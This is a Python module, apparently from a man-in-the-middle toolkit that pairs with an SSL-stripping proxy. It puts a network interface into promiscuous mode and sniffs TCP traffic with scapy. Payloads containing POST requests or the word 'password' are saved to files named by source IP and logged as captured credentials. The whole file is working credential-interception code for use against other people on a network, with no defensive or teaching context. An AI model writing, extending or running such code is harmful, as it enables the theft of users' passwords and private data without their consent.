import scapy.all as scapy
import uuid
import time
from . import STATUS, STOP_EVENT, CAPTURE_DIR
from .utils import log_msg
from .utils import set_promiscuous_mode # Import the new function

def packet_callback(packet):
    if STOP_EVENT.is_set(): return

    if packet.haslayer(scapy.Raw) and packet.haslayer(scapy.TCP):
        try:
            payload = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
            
            # Ignore own SSL Strip Proxy Traffic
            if packet[scapy.TCP].sport == 10000 or packet[scapy.TCP].dport == 10000:
                return 

            is_sensitive = "POST " in payload or "password" in payload
            # ... inside packet_callback ...
            if is_sensitive:
                # NEW NAMING: Time + Source IP (e.g. 103055_192-168-1-20)
                timestamp_id = time.strftime('%H%M%S')
                clean_src = packet[scapy.IP].src.replace('.', '-')
                pkt_id = f"{timestamp_id}_{clean_src}"
                
                src = packet[scapy.IP].src
                
                with open(f"{CAPTURE_DIR}/{pkt_id}.html", "w", encoding="utf-8") as f: f.write(payload)
                
                STATUS["intercepted_data"].append({
                    "id": pkt_id, "time": time.strftime('%H:%M:%S'),
                    "src": src, "dst": packet[scapy.IP].dst,
                    "snippet": f"[SECRET] {payload[:80]}", "type": "ALERT"
                })
                log_msg(f"[ALERT] Creds captured from {src}")
        except: pass

def start_sniffer():
    interface = STATUS["interface"]
    
    # 1. Enable Promiscuous Mode
    # NOTE: This should only be done if running in Silent Mode, 
    # but it's often safer to run the sniffer in this mode anyway 
    # to catch maximum traffic, regardless of the attack mode.
    # We will assume it should run for all active modes too.
    set_promiscuous_mode(interface, True)
    
    try:
        scapy.sniff(iface=interface, store=0, prn=packet_callback, stop_filter=lambda p: STOP_EVENT.is_set())
    except Exception as e:
        log_msg(f"[!] Sniffer Error: {e}")
    finally:
        # 2. Disable Promiscuous Mode upon stop
        set_promiscuous_mode(interface, False)
        log_msg("[SYSTEM] Sniffer thread stopped.")